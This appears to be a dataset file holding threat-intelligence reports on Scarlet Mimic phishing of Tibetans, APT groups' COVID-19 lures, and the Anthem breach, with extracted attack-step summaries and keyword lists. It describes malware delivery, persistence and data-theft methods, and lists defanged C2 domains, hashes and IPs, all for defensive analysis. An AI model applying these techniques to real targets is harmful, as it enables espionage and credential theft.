played a role in this transition, including an increase in certain security behaviors within the Tibetan community (such as not opening or sending attachments), and increasing rates of detection by antivirus products.The information targeted by this group is sensitive, and in the hands of a well-resourced adversary, such as the sponsor of Scarlet Mimic, could cause harm to the safety and security of individuals in Tibet. The extracted information could also be used in support of efforts to frustrate and isolate political groups in the Tibetan diaspora.Phishing relies on tricking users into entering credentials. In this case, there are several telltale signs (such as a slightly outdated Gmail login phishing page) that may suggest to potential victims that something is “not quite right.” However, there are also a number of tools and tactics available to users in the Tibetan community and beyond to stay safe online We describe several of these below.What Can Targeted Users Do? ToolsUse two-factor authentication. This feature is available on many popular email and social network services including those from Google, Facebook, Microsoft, Yahoo, and others. Enabling two-factor authentication means you have to enter your password as well as a code provided by a text, app, or security key to access your account. The second factor helps protect you from credential theft.Password Alert [get it by clicking here] is a Chrome extension developed by Google that notiﬁes you if you enter your  Google credentials into any pages other than the real Google login page (url be cautious about emails containing links or attachments and carefully examine the email sender address in suspicious messages.If an email contains a link always verify that the domain in the URL matches the link text.For further resources on digital security see Tibet Action Institute’s Be a Cyber Super Hero project.Footnotes 1.The one divergence from this pattern that has been previously reported was a 2013 Strategic Web Compromise (SWC) attack against the Tibetan Alliance of Chicago’s website documented by WebSense. A SWC is an attack in which attackers compromisenormally trusted websites and serve malicious code to speciﬁc visitors. In this case, the attackers used the Tibetan website to serve  an Internet Explorer vulnerability (CVE-2012-4969) that was patched in 2012. This attack used the domain mail[.]firewall- gateway[.]com as a C2, which is from the same dynamic DNS service as the FakeM SSL Custom variant attacks.AcknowledgementsThis research was supported by the John D. and Catherine T. MacArthur Foundation (Professor Ronald J. Deibert, Principal Investigator). Special thanks to PassiveTotal, Ron Deibert, Lobsang Gyatso, Sarah McKune, Adam Senft, and Nart Villeneuve.Appendix A: Phishing Campaigns in Detail Phishing Attack 1 The ﬁrst phishing attack we saw was sent on November 9, 2015 to a group of Tibetan journalists. The message purported to  contain a link to a document with information on a controversial Buddhist sect known as Dorje Shugden or Dolgyal, which has been involved in protests against the Dalai Lama.From: Choephel Tenzin <tenzinch128@gmail.com> Date: Mon, Nov 9, 2015 Subject: Who is demonstrating against the Dalai Lama To: [Redacted]   File regarding Dolgyal. Who is demonstrating against the Dalai Lama.docThe link “Who is demonstrating against the Dalai Lama.doc” actually goes to url gateway[.]com/servicclogin. When we ﬁrst checked this link on November 13, the page was down and we therefore do not  know what the original destination content was for this attack.Destination Content SwitchOn November 25 the link was active and the destination content was a public Google Drive folder that contained campaign materials on climate change from a Tibetan NGO. The climate change theme is signiﬁcant, as during this period Tibetan  organizations were taking part in advocacy to raise awareness on climate change in Tibetan areas in anticipation of the United Nations Conference on Climate Change held in Paris, France from November 30 to December 12, 2015.Phishing Attack 2 The second phishing attack was sent to Tibetan journalists on November 22, 2015.In this case the email was made to appear to come from a Tibetan activist, describes a video on China and Tibet, and shares a link to what appears to be a video sharing site, but is actually url Dorjee Tenzin <tenzinsft@gmail.com> Date: 22 Nov 2015 Subject: How CHINA takes care of Tibet and Tibetans – video To: [Redacted] This video – How CHINA takes care of Tibet and Tibetans – is short and easy to understand. Must watch. url November 22, 2015, if users entered their credentials into the Google login phishing page they would be redirected to the video described in the email.Destination Content SwitchOn November 25, 2015, the destination content was changed to a website used to organize the Global Climate March (globalclimatemarch.org), a demonstration to raise climate change awareness around the United Nations Conference on Climate Change.The November 25, 2015 destination content change shares the timing and theme of the change we observed on the previous URL path variation. While we do not have additional phishing emails from this period, these commonalities suggest the attackers were sending phishing emails with climate change themes around November 25, 2015. Phishing Attack 3 On November 23, 2015, an email appearing to be from the Press Ofﬁcer of the Central Tibetan Administration was sent to multiple  Tibetan journalists, activists, and NGO staff members.From: Tsering Wangchuk <euhrdesk.diir@gmail.com> Date: 23 Nov 2015 Subject: Press Invitation The media is cordially invited by the Election Commission of the Central Tibetan Administration its press conference regarding the upcoming Sikyong and Tibetan ﬁnal elections at Lhakpa Tsering hall, DIIR, on November 27, 2015, at 10:00 AM.  Press Invitation.pdfTsering Wangchuk www.tibet.net Twitter: urlﬁcerct  Facebook: url DIIR, CENTRAL TIBETAN ADMINISTRATIONThe “Press Invitation.pdf” link actually goes to url On November 23, when the email was sent, if the user entered their credentials into the phishing page they would be redirected to a Google Doc containing a copy of an op-ed written by the Central Tibetan Administration on climate change. The destination content and the email message do not match in this case, which may be evidence of the attackers neglecting to switch out content from a previous campaign.Destination Content SwitchOn November 26, 2015, the destination content to which the phishing page redirected users was changed to a Google Drive document that provides the program for a visit to Dharamsala, India by Chilean Parliamentarians.Appendix B: Indicators of Compromise Scarlet Mimic Malware Campaign 2 Attack 2File attachmentsFilenames: Reappraisal_of_India_Tibet_Policy.doc Genuine autonomy or complete independance.doc Application for Mentee.doc Phishing Campaign Infrastructurefilegoogle[.]firewall-gateway[.]com accountgoogle[.]firewall-gateway[.]com detail43[.]myfirewall[.]orgurl url url a CommentYour email is never shared. Required ﬁelds are marked  *Name *Email *WebsiteCommentPost Comment© Citizenlab 2013 | Contact | RSS "," 1. The Scarlet Mimic group sends spearphishing emails with malicious document attachments to targets in the Tibetan community. 2. The documents exploit vulnerabilities to install malware like FakeM on the target's system. 3. The malware connects to C2 servers on dynamic DNS domains for further control. 4. Over time, the Tibetan community promotes safer practices like avoiding attachments. 5. Scarlet Mimic shifts to phishing emails with links instead of attachments. 6. The phishing pages are hosted on old C2 infrastructure domains. 7. Targets who enter credentials on the phishing pages are redirected to decoy content. 8. The group adapts phishing themes to match current events and interests in the Tibetan community. ",valid_101,"['Scarlet Mimic', 'phishing emails', 'us', 'Attachments', 'targets', 'the Tibetan community', 'documents', 'vulnerabilities', 'FakeM', 'the target', 'the malware', 'C2 servers', 'DNS', 'domains', 'Control', 'time', 'links', 'the phishing pages', 'C2 infrastructure', 'credentials', 'decoy content', 'AP', 'themes']",Scarlet Mimic; phishing emails; us; Attachments; targets; the Tibetan community; documents; vulnerabilities; FakeM; the target; the malware; C2 servers; DNS; domains; Control; time; links; the phishing pages; C2 infrastructure; credentials; decoy content; AP; themes.
"WHITE PAPERAPTs and COVID-19: use the coronavirus as a lure Malwarebytes Threat Intelligence April 2020Table of contents Introduction: APT groups using COVID-19 3 Template injection 4 Malicious macros 10 Kimsuky 10 Konni (APT37) 11 Ocean Lotus 19 RTF exploit 20 Calypso Group 20 Chinese actor (Winnti) 21 Malicious LNK files 22 Mustang Panada 22 APT groups using COVID-19 Coronavirus (COVID-19) has become a global pandemic, upending economies, livelihoods, schools and hospital systems—nearly every facet of everyday life has been touched. Such uncertainty and fear surrounding the virus and its impact represents a golden opportunity for threat actors to exploit the situation. By using social engineering tactics such as spam and spear phishing campaigns with COVID-19 as a lure, cybercriminals and threat actors increase the likelihood of successful attack.In this paper, we provide an overview of several different APT groups using coronavirus as a lure, as well as a description of their varied attack vectors. We categorize the APT groups according to the technique they used to send spam or phishing emails: Template injection, Malicious macros, RTF exploits, and malicious LNK files.From late January on, several cybercriminal and state- sponsored groups have been doing just that, using coronavirus-themed phishing emails as their infection vector to gain a foothold on victim machines. Just like the coronavirus itself, China was the first target of Advanced Persistent Threat ( APT) groups, and as the virus spread worldwide, so did the cyberattacks.Once their victims’ attention was captured by social engineering, threat actors used various techniques to deploy malware, such as embedding macros in Microsoft documents attached to phishing emails or exploiting system or browser vulnerabilities to drop malicious software.APTs and COVID-19: How advanced persistent threats use the coronavirus as a lure3 33Template injection Template injection refers to a technique in which threat actors embed a script moniker in the lure document—usually a Microsoft Office document—that contains a link to a malicious Office template via an XML setting. Upon opening the document, the remote template is dropped and executed. Kimsuky and Gamaredon are examples of APTs using template injection.Kimsuky Kimsuky (also known as Velvet Chollima) is a North- Korean threat actor group that has been active since 2013 and is known to be behind the KHNP (Korea Hydro & Nuclear Power) cyber terrorism attacks of 20141. The group mainly targets Korean think tanks, DPRK/nuclear- related targets, and several US firms with the main goal of delivering malicious payloads to its targets and stealing web application accounts.Starting in early March 2020, Kimsuky began using spear phishing emails with COVID-19 in the subject line as its initial infection vector. The emails contain malicious documents weaponized with CVE-2017-01992. This vulnerability allows remote code execution by exploiting a flaw in the Microsoft Office OLE interface to deliver malware.Upon opening the document, a prompt asks victims to “enable content” to show information about the coronavirus.Figure 2: Malcious document after enabling contentAfter enabaling the content, a script moniker “in word/_rels/setting[.]xml[.]rels” is triggered and drops a Microsoft document template called web.dotm from the following url:url Templetes/normal.php?name=webFigure 1: Malicious document used as a lureFigure 3: setting.xml.rels content4The “web.dotm” has an embedded macro which is designed to target Mac users (Figure 4). This macro also runs on Windows OS, however, it only executes its main malicious functionality on a Mac. There is an “If statement” that checks the operating system and executes a remote Python script called “Secured.APP”.Figure 4: Malicious macro embedded in web.dotmFigure 5 shows the content of “Secured.APP”, which executes the second stage Python script. Based on the directory information provided in this script, it seems it is targeting users with Microsoft Office version 2016 or earlier.Figure 5: Secured.APP5The second payload, as depicted in Figure 7, is spyware that collects information by running several commands and sending the collected data to its C&C server. The main function is “SpyLoop”, which collects and sends device/user information in an infinite while loop.The list of collected information, stored in separate files (Figure 6), is as follows: • Architecture info • System infoExternal network info Firewall• Apple Pay Language and region List of running processes List of installed Applications List of files in Documents/Downloads/Desktop directory List of volumes List of users• •Figure 6: Content of collected informationThe directory is then compressed with a password (“doxujoijcs0qei09213@#$@”) and uploaded as a zip file in an http request as shown in Figure 7.6Figure 7: Second Python scriptThe next function in the loop is “ExecNewCommand”, which is likely used to download additional content. It then sleeps for five minutes and repeats the same process. At time of writing, it only responded with a “200 OK”.APTs and COVID-19: How advanced persistent threats use the coronavirus as a lure7 77Gamaredon Gamaredon is a Russian APT that primarily performs cyber espionage operations against Ukrainian military forces, as well as individuals related to the Ukrainian government. Gamaredon has been active since 2013 and often uses spear phishing as its initial infection vector.Between March 23 and 25, Gamaredon sent phishing emails using the COVID-19 theme and employed remote template injection within their lure, a Microsoft Word document written in Russian. (Figure 8).Upon opening the document, a remote template is dropped from the link provided in the XML setting (Figure 9).We were not able to retrieve this template at time of publishing, but found other similar templates used by this APT days before this campaign and realized they are using similar malicious macros. Figure 10 shows an example of such a macro.Instead of executing the malicious behavior upon opening the document (using the “auto_open” function), the malicious macro in this document is executed in the “Document_close” function. This could be to bypass dynamic analysis if the document is not closed before the sandbox times out.The macro collects the computer name, home drive’s label/serial number, and BIOS information (using WMI) and sends it to a hardcoded C2 server with this format:url BiosVersionInfoFigure 9: Template injectionFigure 8: Lure documentAPTs and COVID-19: How advanced persistent threats use the coronavirus as a lure8 88It then creates a VBS script in the %APPDATA% directory and makes it persistent by copying it into the startup directory. In addition to the mentioned items, the script also collects keyboard layout and country code and checks whether Process explorer or Wireshark are running on the system.Figure 10: Macro embedded in templateThe APT group then drops its custom backdoor “Pterodo” that is capable of downloading other malware variants and collecting sensitive information3.9Malicious MacrosEmbedding malicious macros is the most popular method of infection used by APTs. In this attack vector, a macro is embedded in the lure document that will be activated upon its opening. In the following sections, we look at APTs using this method in their COVID-19 lure.Kimsuky In the previous section, we mentioned that Kimsuky is using template injection to infect Mac users. We also observed this actor using COVID-19-themed malicious macros to target Windows users mostly in South Korea4. (Figure 11):Figure 11: Malicious document targeting Windows usersAPTs and COVID-19: How advanced persistent threats use the coronavirus as a lure10 1010The malicious macro is obfuscated, as shown in Figure 12:Figure 12: Malicious obfuscated macroAfter de-obfuscating the script, we can see the value stored in the content variable as:This uses “mshta” to execute a malicious search.hta file from its server. The content variable is then executed by Wscript. The “Search.hta” contains a script that downloads another script. The downloaded script is spyware that collects sensitive information, such as IP addresses, usernames, list of processes, RDP information, and Outlook information and sends it back to the server.Figure 13 shows the lure document, named “Keep an eye on North Korean cyber.doc”:Konni (APT37) Konni is a North Korean APT that has been active since 2012 and is known to target South Korean organizations in the chemicals, electronics, manufacturing, aerospace, automotive, and healthcare industries. In 2017, the group expanded its operations, targeting organizations in several other countries, such as the US, Japan, Vietnam, Russia, Nepal, China, India, Romania, Kuwait, and countries in the Middle East. Recently, researchers found several communalities between this APT and Kimsuky, showing there is a close tie between these two groups5.Konni is known to use spear phishing emails, strategic web compromises, and torrent file-sharing sites to compromise its victims. In mid-March, they began sending spear phishes with COVID-19 warnings, ironically advising readers to watch out for North Korean cybercrime spikes related to the spread of the virus.Figure 13: Lure document11The embedded macro in this document includes an encrypted executable code that is XOR decoded and stored in the “C\Users\UserName\” directory (Figure 14). The dropped executable is a downloader for their popular Konni Remote Access Trojan (RAT) downloaded from6:url 14: Embedded macro12APT36 APT36 is another threat group that has employed macro-embedded COVID-19 themes in their recent campaigns. The group is believed to be Pakistani state-sponsored, mainly targeting the defense, embassies, and government of India.7 Their coronavirus attacks began on March 12 and included phishing emails with attached malicious documents, which dropped Crimson RAT payloads on victim machines. Patchwork Patchwork, also known as Dropping Elephant, Chinastrats, APT-C-09, and Quilted Tiger, is an Indian threat actor that has been active since 2013. The primary targets of this APT are organizations related to diplomatic and government agencies in China, Japan, the Middle East, the UK, the US, Bangladesh, Sri Lanka, and Pakistan. Patchwork mainly uses spear phishing methods to gain access to victims’ machines.In early February, Patchwork began sending phishing emails with a COVID-19 theme, using malicious Excel documents to target Chinese organizations (Figure 15).Figure 15: Lure documentAPTs and COVID-19: How advanced persistent threats use the coronavirus as a lure1313The embedded macro (Figure 17) is simple: It downloads a script from the URL embedded as a formula in column “X”, row “100”. (Figure 16).Figure 16: Url embedded in the cellFigure 17: MacroThe downloaded Scriptlet “window.scr” (Figure 18) is responsible for dropping and executing another payload, which is a custom backdoor developed by the actor.Figure 18 window.scr14Hades Hades is the APT group behind the attack against the Pyeongchang Winter Olympics. Evidence suggests that this group is connected to the well-known Russian threat actor APT288.In their recent campaign called Tricky Mouse, Hades targeted Ukrainian users using COVID-19 lures9, 10. The attack started by sending a macro-embedded document to victims (Figure 19).The embedded macro (Figure 20) decodes and drops a RAT executable into the victim’s machine.Figure 19: Hades lure documentFigure 20: Embedded macro15The RAT is dropped in the local user directory as “conhost.exe”. That RAT is a .NET executable obfuscated by “Eazfuscator.net” (Figure 21):Figure 21: Hades RATAfter de-obfuscation. we saw that the RAT had several functionalities, such as collecting system and user information, taking screenshots, and logging keystrokes.The “Kdaapk” module is responsible for performing C&C communications. The C&C URL is hardcoded within this module as you can see in Figure 22:Figure 22: Hades RAT after deobfuscation16TA505 TA505 is an APT group that started its activity by distributing the Dridex banking Trojan on mass scale in 201411. The group is considered unique, as it’s a financially-motivated team of threat actors that uses a wide variety of malware families.Starting on March 9th, TA505 used malicious macros in their COVID-19 themed documents, which included Microsoft Excel spreadsheets. Figure 23 show such a document after enabling its content:As you can see in Figure 24, upon opening the document, a progress bar dialog box pops up (UserForm1_show). The dialog box is used to confuse the user while the main malicious functionality is located in the popped-up dialog box activate function (Figure 25).Figure 23: Lure documentFigure 24: Embedded macroAPTs and COVID-19: How advanced persistent threats use the coronavirus as a lure17 1717When the dialog box is popped up, the “UserForm_ Activate()” function is executed, which calls “Nlgebredneh()” function:Figure 25: Trigger function of the dialog boxThe “Nlgebredneh()” function drops “paper.xls” in the “%APPDATA%” temp directory and extracts “oleobject1. bin” from “paper.xls”. In the next step, it decrypts the content of “oleobject1.bin” into “reinforce.dll” in the “%APPDATA%/Microsoft/Windows/Templates” directory. Finally, it executes the DLL file.Figure 26: The “Nlgebredneh” functionThe DLL file is a small downloader that decrypts the next payload into memory. The downloader drops additional malware families associated with TA505, such as banking Trojans and RATs.18TA542 TA542 (Mummy Spider) is a Russian-speaking threat actor group behind the distribution of Emotet, which was first seen in the wild in 201412. At first, TA542 used modules from the Feodo banking Trojan, but over time developed their malware with modular architecture adding new capabilities.Since the emergence of COVID-19, TA542 has started using coronavirus themes in various email distribution campaigns. Malicious documents distributed by the actor have embedded macros that act as a downloader for Emotet malware13. Bitter Bitter is suspected to be a south Asian APT group targeting Pakistan and China since 201514. According to other security researchers, this group has also used COVID-19 themes to target China15. Macro-embedded documents distributed by this group download and drop a variant of its custom RAT that has been written in .Net. Unfortunately, we were not able to retrieve any sample related to this campaign.Ocean Lotus APT32 (Ocean lotus, Sea Lotus) is a Vietnamese APT that has been active since 2014.The group has targeted private sectors as well as governments and journalists from Australia, Brunei, Cambodia, China, Germany, Indonesia, Laos, Malaysia, Myanmar, Philippines, Singapore, Thailand, the US, and Vietnam. Ocean Lotus has used strategic web compromises and spear phishing to gain foothold into victims’ machines16.Ocean Lotus also used malicious macro-embedded documents with COVID-19 themes to target China, starting February 19. In this attack, the malicious document dropped the “Denis” Trojan, a malware family that has been developed by this group17.APTs and COVID-19: How advanced persistent threats use the coronavirus as a lure19 1919RTF exploit RTF is a flexible text format that was introduced by Microsoft a long time ago. The flexibility of embedding any object type within makes RTF files vulnerable to many OLE objects related vulnerabilities. Several threat actors, especially Chinese ones, use RTF files in their campaigns. Among them are the Calypso group and Winnti threat actors who have used RTF files in their COVID-19 campaigns.In this campaign, the RTF file exploits the equation editor vulnerability to drop “intel.wll” into the “AppData/ Roaming/Microsoft/Word/STARTUP/” directory (Figure 27). “intel.wll” is then executed each time the Microsoft Word application is launched. This DLL downloads additional payloads, including a backdoor with several capabilities, such as taking screen shots, executing new processes, or collecting system information.Calypso Group Calypso is a Chinese APT group that has been performing cyber espionage operations since 201618, 19. The group has targeted governments in Brazil, India, Kazakhstan, Russia, Thailand, Belarus, Mongolia, and Turkey.In the new campaign, called Vicious Panada, Calypso Group has targeted the Mongolian public sector by sending malicious RTF files to victims disguised as COVID-19 related documents20.The RTF file has been weaponized with the Royal Road RTF weaponization tool. The tool is known to be used by several Chinese actors and has the capability to embed objects within RTF files that exploit vulnerabilities related to Microsoft Equation Editor. (CVE-2017-11882, CVE-2018-0798, CVE-2018-0802)21.Figure 28: RTF file embedding k.dll20Looking at the Equation Native Stream, we can see that this DLL is made persistent by using the run registry key “Microsoft\Windows\CurrentVersion\Run” (Figure 29). In this case, “k.dll” is executed each time the system reboots.Figure 29: Equation native streamA code similarity check between “k.dll” and “intel.wll” showed that both have similar functionalities and the same exported function named “Engdic”.Chinese actor (Winnti) Another Chinese threat actor that used the Royal Road weaponization framework with a COVID-19 theme recently dropped a backdoor variant named Chinoxy by exploiting the equation editor vulnerability22, 23. Some evidence suggests that Winnti is the actor behind this campaign, but we cannot confirm it22, 24, 25.21Malicious LNK files LNK files are shortcut files used by Microsoft Windows. They are considered a Shell item type that can be executed. From 2013 on, attackers have used malicious LNK files to infect their victims. A few APTs started using malicious LNK with COVID-19 themes from late February to mid-March to ensnare victims.Mustang Panada Mustang Panda is a Chinese threat actor that has targeted NGOs (non-government organizations) since 2017. The group’s main targets are US think tanks and NGO organizations in Mongolia. Mustang Panda uses spear phishing emails to initiate its attacks and usually drops either Poison Ivy or the PlugX RAT26, 27.In their COVID-19 phishing campaign, Mustang Panda sent an LNK file containing a malicious HTA application, which contained a VB script (Figure 30).Figure 30: HTA fileAPTs and COVID-19: How advanced persistent threats use the coronavirus as a lure22 2222In the properties of this LNK file, there is a command that will be executed when the file is opened (Figure 31).Figure 31: CommandThe command calls “mshta.exe” to execute the HTA application that drops and runs a payload. The payload has a resource that is dropped in the victim’s machine. The final payload in this campaign is either a variant of PlugX RAT or Cobalt Strike. Higaisia Anomali has reported another threat group called Higaisia using malicious LNK files to perform malicious operations using COVID-19 themes. The actor sends an LNK file disguised as a PDF via spam campaigns. After opening the LNK file, an actual PDF file is opened28.It is assumed that the group behind this campaign is a North Korean actor targeting English speaking people/ organizations28.Opening the LNK file leads to execution of the command embedded in the property section (Figure 32). The command decodes an embedded base64 payload and drops it into the victim’s machine.The dropped payload is a cabinet file that contains multiple files. The content of the cabinet file is extracted using the legitimate Windows executable “extract.exe”. From there, multiple stages are executed and finally, a variant of the PlugX RAT is dropped.Figure 32: CommandAPTs and COVID-19: How advanced persistent threats use the coronavirus as a lure23 2323Conclusion In this report, we provided an overview of various APT groups using the COVID-19 pandemic as a theme in several different types of malicious campaigns to increase the odds of their attacks’ success. This shows that threat actors are closely monitoring public events happening around the world, and quickly employing those themes in attack vectors to take advantage of the opportunity. We expect that in the coming weeks and months, APT threat actors will continue to leverage this crisis to craft phishing campaigns using social engineering techniques and other malicious tactics embedded into lure documents to compromise their targets.The Malwarebytes Threat Intelligence team is monitoring the threat landscape and paying particular attention to attacks trying to abuse the public’s fear of the COVID-19 crisis. Our business and consumer customers are protected from these attacks and more, thanks to our multi-layered detection engines.For more information about the threat landscape or how our products thwart advanced attacks, feel free to get in touch with us at intel@malwarebytes.com.Sources1. [Online]. Available: url abstracts/kimsuky-group-tracking-king-spear-phishing. 2. [Online]. Available: url intelligence/cve-2017-0199-new-malware-abuses-powerpoint-slide-show/. 3. [Online]. Available: url gamaredon-like-fancy-bear-and-cozy-bear-steps-up-cyberattacks-against- ukraine-others/. 4. [Online]. Available: url 5. [Online]. Available: url 6. [Online]. Available: url under-radar-for-years.html. 7. [Online]. Available: url apt36-jumps-on-the-coronavirus-bandwagon-delivers-crimson-rat/. 8. [Online]. Available: url 9. [Online]. Available: url 10. [Online]. Available: url of-global-outbreak-related-cyber-attacks/. 11. [Online]. Available: url actor-profile-ta505-dridex-globeimposter. 12. [Online]. Available: url threat-actor-profile-ta542-banker-malware-distribution-service. 13. [Online]. Available: url fears-seized-by-cybercriminals. 14. [Online]. Available: url continues-targeting-government-of-china-and-chinese-organizations.15. [Online]. Available: url 16. [Online]. Available: url 17. [Online]. Available: url 18. [Online]. Available: url 2019/#id1. 19. [Online]. Available: url group. 20. [Online]. Available: url covid-campaign/. 21. [Online]. Available: url royal-road.html. 22. [Online]. Available: url chinoxy. 23. [Online]. Available: url backdoor-using-covid19-document-lure-83fa294c0746. 24. [Online]. Available: url 25. [Online]. Available: url updates. 26. [Online]. Available: url 27. [Online]. Available: url 28. [Online]. Available: url being-utilized-by-threat-actors-of-varying-sophistication.Malwarebytes is a cybersecurity company that millions worldwide trust. Malwarebytes proactively protects people and businesses against malicious threats, including ransomware, that traditional antivirus solutions miss. The company’s flagship product uses signature-less technologies to detect and stop a cyberattack before damage occurs. Learn more at www.malwarebytes.com. "," 1. Threat actors send phishing emails with COVID-19 themes and malicious attachments to target victims. The attachments are typically weaponized Office documents like Word, Excel, PowerPoint files. 2. If the document contains a template injection attack, upon opening, it fetches a remote malicious template that gets executed. The template usually contains a macro. 3. If the document contains a malicious macro directly, it gets triggered automatically when the document is opened. The macros are often obfuscated to evade detection. 4. The macro then extracts and decrypts an embedded executable payload or reaches out to download one from a remote server. 5. The decrypted payload is a malware module, commonly a remote access Trojan (RAT) or banking Trojan. 6. The malware module contains capabilities to collect sensitive information from the infected system, communicate with command and control servers, download additional modules, and allows remote control. 7. Finally, the infiltrated system's data is exfiltrated back to the threat actor's servers. The access can also be leveraged to move laterally within networks. ",valid_96,"['threat actors', 'phishing emails', 'COVID-19 themes', 'victims', 'Office', 'Word', 'Excel', 'PowerPoint', 'files', 'the document', 'Template injection', 'opening', 'a macro', 'Malicious macro', 'The macro', 'macros', 'detection', 'malware', 'access', 'Trojan', '(RAT', 'capabilities', 'sensitive information', 'System', 'command', 'addition', 'modules']",threat actors; phishing emails; COVID-19 themes; victims; Office; Word; Excel; PowerPoint; files; the document; Template injection; opening; a macro; Malicious macro; The macro; macros; detection; malware; access; Trojan; (RAT; capabilities; sensitive information; System; command; addition; modules.
"url Anthem Hack: All Roads Lead to ChinaPosted February 27, 2015 by ThreatConnect Intelligence Research Team (TCIRT)[1] �led under Threat Research[2].UPDATE: Premera Latest Healthcare Insurance Agency to be Breached[3]When news of the Anthem breach was reported on February 4th, 2015, the security industry quite understandably went wild. A breach of this magnitude was certainly unprecedented. Naturally, many industry professionals were keenly interested in digging into this incident to see what could be uncovered, and the research team at ThreatConnect was no exception. Thanks to our powerful API[4] and third-party partner[5] integrations, we were able to use ThreatConnect to quickly uncover a wealth of intelligence even when initially hindered by a relative lack of investigative lead information and context, a key requirement of any Threat Intelligence Platform[6] (TIP). However, before we delve into what we were able to uncover, let’s brie�y review the facts as they stood in the wake of the initial discovery announcement.1 of 3303/22/2015 10:14 PMurl We Know:On the morning of February 4th, 2015, several major news outlets broke the story[7] that Anthem, Inc.’s network defenses had been breached. According to a statement from Anthem’s CEO[8], the company fell victim to a “very sophisticated external cyber attack,” and the hackers “obtained” the personally identi�able information (PII) of approximately 80M customers. This included social security numbers, birthdays, street addresses, phone numbers and income data – plenty of information to enable identity theft. This was a signi�cant event for several reasons:Anthem, formerly known as Wellpoint, is the largest managed healthcare company in the Blue Cross Blue Shield Association, and by extension, one of the largest healthcare organizations in the United States. As such, any compromise, no matter how insigni�cant, would likely impact countless individuals. Blue Cross Blue Shield provides healthcare coverage for about half the U.S. federal workforce. This means that their information was potentially compromised too. Unlike the Sony hack which was destructive in nature and meant to send a message for coercive purposes, the Anthem compromise was purportedly very covert, a fact which may suggest something about the adversary’s motives. As of late February 2015, there have not been any indications that the ex�ltrated PII data was immediately commoditized on the black market for the purpose of enabling identity theft, as was the case in the Home Depot Breach.2 of 3303/22/2015 10:14 PMurl the Gaps:Obviously, these high-level observations do not provide cybersecurity researchers a great deal of information to work with. However, when presented within the context of a Threat Intelligence Platform (TIP), an incomplete trail of evidence can highlight intelligence gaps, a study of which can orient threat researchers towards their analytic objectives. To this end, let’s examine what we wanted to discover in the context of the Anthem breach:Who was responsible for the attack? What was the objective of the attack? Was it cyber theft, an espionage operation, or something different? Who was targeted in the attack? The answer to this question, obscured as it may be, would likely shed some light on the objective of the breach. What was the timeline of the activity?The real power of a Threat Intelligence Platform is demonstrated when you are able to collect and maintain a robust dataset of threat indicators, both past and present, which can help orient you in the right direction in the wake of a newly discovered breach. Even when you do not have a good deal of information to start with (for example a �le hash, or an IP address), you may �nd leads by pivoting through archived datasets until you uncover key pieces of the puzzle. In the case of the Anthem breach, we were able to do just that.3 of 3303/22/2015 10:14 PMurl Themed Infrastructure & Signed Malware:In September 2014, the ThreatConnect Intelligence Research Team (TCIRT)[9] observed a variant of the Derusbi APT malware family, MD5: 0A9545F9FC7A6D8596CF07A59F400FD3[10], which was signed by a valid digital signature from the Korean company DTOPTOOLZ Co. Derusbi is a family of malware used by multiple actor groups but associated exclusively with Chinese APT. TCIRT began tracking the DTOPTOOLZ signature for additional signed malware samples and memorialized them within our Threat Intelligence Platform over time.Analyst Comment: The DTOPTOOLZ signature has also been observed in association with Korean Adware that is af�liated with the actual DTOPTOOLZ Co. This adware should not be confused with the APT malware that is abusing the same digital signature.Later, in mid-November we discovered another implant that was digitally signed with the DTOPTOOLZ signature. This implant, “Sakula” (aka. Sakurel) family of malware, a known variant of the Derusbi backdoor, and was con�gured to communicate with the malicious command and control (C2) domains extcitrix.we11point[.]com and www.we11point[.]com. Through our Farsight Security passive DNS[12] integration, we uncovered that this malicious infrastructure was likely named in such a way to impersonate the legitimate Wellpoint IT infrastructure.4 of 3303/22/2015 10:14 PMurl DNS and historic DomainTools Whois data also provided insights that helped establish an initial timeline dating back to April 2014, when the faux domains came into existence and were later operationalized by the attackers. A Threat Intelligence Platform should allow for analysts to easily put together and organize such insights, collaborate around relevant analysis internally, and share the �nished analysis with external industry groups and organizations. In the hopes that our community members could bene�t from or provide further insight into this suspicious incident, we immediately shared our threat intelligence including indicators, signatures and analytical context to the ThreatConnect Medical and Health Community[13] on November 13, 2014. This included sending out a noti�cation to all stakeholders as well as our followers on Twitter[14].When the Anthem breach later came to light in early February, we re-shared the signatures, indicators and context freely to the entire ThreatConnect user base. As we dug further, we expanded our understanding of the malicious we11point[.]com infrastructure, taking particular interest to the subdomains such as “extcitrix.we11point[.]com and “hrsolutions.we11point[.]com”. Note the “citrix” and “hr” (human resources) pre�xes that the adversary used to mirror legitimate remote infrastructure and employee bene�ts resources in the May 2014 timeframe. This provided initial insights as to the likely targeting themes and or vectors in which the adversary may have used when initiating their targeting campaign.5 of 3303/22/2015 10:14 PM[15]url fact that the malicious infrastructure closely mirrored other legitimate Wellpoint infrastructure supported our hypothesis that the Derusbi / Sakula malware was con�gured to operate and persist within a speci�c target enterprise.Possible Premera Blue Cross Infrastructure:Retrospective analysis of other targeted malware samples using the DTOPTOOLZ Co. digital signature led to the identi�cation of an “HttpBrowser” / “HttpDump” implant MD5: 02FAB24461956458D70AEED1A028EB9C[17] (OpenOf�cePlugin.exe), which was �rst observed on December 11, 2013. Although this malware sample is not Derusbi / Sakula, it too is strongly believed to be associated with Chinese APT activity and in fact may have also been involved in a Blue Cross Blue Shield6 of 3303/22/2015 10:14 PMtargeting campaign as early as December 2013.url This particular binary is con�gured to connect to the static IP address 142.91.76[.]134. Passive DNS of this IP indicates that on December 11th, 2013, the same date as the malware sample was observed, the domain prennera[.]com also resolved to 142.91.76[.]134. It is believed that the prennera[.]com domain may have been impersonating the Healthcare provider Premera Blue Cross[19], where the attackers used the same character replacement technique by replacing the “m” with two “n” characters within the faux domain, the same technique that would7 of 3303/22/2015 10:14 PMurl seen �ve months later with the we11point[.]com command and control infrastructure.Section Summary:The Derusbi / Sakula malware implant types are unique in that they have traditionally been seen within Chinese APT espionage campaigns. The “HttpBrowser” / “HttpDump” malware implant (while a different family of malware than Derusbi / Sakula) is also believed to be of Chinese origin, and was also digitally signed with the DTOPTOOLZ digitalsignature. This implant connected to a C2 node that overlapped with prennera[.]com. We believe that the prennera[.]com domain may be impersonating Premera Blue Cross (premera.com), using a similar character replacement technique seen in the we11point[.]com campaign.VAE Inc. Themed Infrastructure & Signed MalwareAnother powerful attribute of ThreatConnect is the ability for analysts to logically group items such as atomic indicators, related documents or signatures, all of which may include individualized custom context enrichments and associations. Over time, the ability to memorialize groupings of related or like activity allows analysts to quickly uncover non-obvious relationships within their private datasets. This is exactly what happened as we continued to8 of 3303/22/2015 10:14 PMurl these incidents.As industry analysts and media speculated Chinese APT involvement[20] in the Anthem breach, our focus into the Derusbi / Sakula malware signed with the 